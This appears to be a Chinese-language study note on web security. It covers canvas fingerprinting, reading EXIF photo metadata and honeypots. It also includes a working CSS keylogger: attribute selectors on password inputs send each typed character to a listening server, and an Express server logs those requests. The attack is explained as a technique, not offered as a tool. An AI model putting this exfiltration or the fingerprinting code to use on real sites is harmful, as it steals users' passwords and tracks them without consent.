### 网络安全

###

#### 1、canvas指纹追踪技术

```javascript
const uuid = () => {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    const txt = '指纹追踪';
    ctx.fillText(txt, 10, 10);
    return canvas.toDataURL(); // 获取用户设备及操作系统
}
// 防止被跟踪
// 安装浏览器插件，随即修改canvas指纹的插件， CanvasFingerprintBlock 
// 原理：每次随机往canvas画布里注入一个随机的噪音（人肉眼是看不到的），从而影响bease64加密；
```

#### 2、css键盘记录器 - React
<pre>
    这种行为只存在于使用React/类React框架的页面中
    场景一般隐匿于第三方脚本当中，从而窃取你的密码。
    攻击手段利用css属性选择器，可以在加载background-image 通过url进行请求
    使用一个简单的脚本可以创建一个css文件，该文件将为每个ASCII字符发送一个自定义请求，
    因为react会设置value值。
</pre>
```css
/*css 脚本*/
input[type="password"][value$="0"]{background-image: url("http://localhost:3000/0")}
input[type="password"][value$="1"]{background-image: url("http://localhost:3000/1")}
input[type="password"][value$="2"]{background-image: url("http://localhost:3000/2")}
input[type="password"][value$="3"]{background-image: url("http://localhost:3000/3")}
input[type="password"][value$="@"]{background-image: url("http://localhost:3000/40")}
/* ... */
```
```javascript
// 创建服务器并启动 监听键盘输入值
const express = require('express')
const app = express()
app.get('/:key',(req,res)=>{
    process.stdout.write(`${req.params.key}\n`)
    res.sendStatus(200)
})
app.listen(3000,()=>{
    console.log('listening on 3000')
})
```

#### 3、图片信息（EXIF) 可交换图像文件
<pre>
    EXIF是镶嵌在jpeg/tiff图像文件格式内的一组拍摄参数，需要注意的是EXIF信息不支持png,webp等格式。
    EXIF（图像文件格式）是一种图像文件格式，它允许图像文件包含有关图像拍摄条件和方式的有关信息。
    这些信息可以包括拍摄日期、拍摄地点、相机型号、白平衡、光圈、快门速度、ISO感光度等。
    这些信息可以被图像处理软件读取，并用于图像的编辑、调整、美化等操作。
    使用场景：
    勾选上传原图会将EXIF信息一起上传，在下载原图时，会自动下载包含EXIF信息的图片。
</pre>
```javascript
import EXIF from 'exif-js'
const img = document.getElementById('image');
img.onload=()=>{
    EXIF.getData(img, function() {
        const exifData = EXIF.getAllTags(this);
        const res = EXIF.pretty(this);
        console.log(res);
        // 输出EXIF信息
        console.log(exifData);
    });
}
```

#### 4、蜜罐技术
<pre>
    蜜罐技术是一种防御性网络安全技术，用于检测、分析和响应网络攻击。
    蜜罐是一种虚拟的目标，用于诱捕和捕获网络攻击者的攻击行为。
    蜜罐技术通过部署一系列虚拟系统、网络设备、应用程序等，来模拟真实的目标系统，并将其暴露在互联网上。
    当攻击者试图攻击这些虚拟系统时，会被蜜罐捕获和记录下来，从而可以分析和检测攻击者的行为。
    蜜罐技术可以有效地保护真实的目标系统，并提高网络安全防护能力。
</pre>
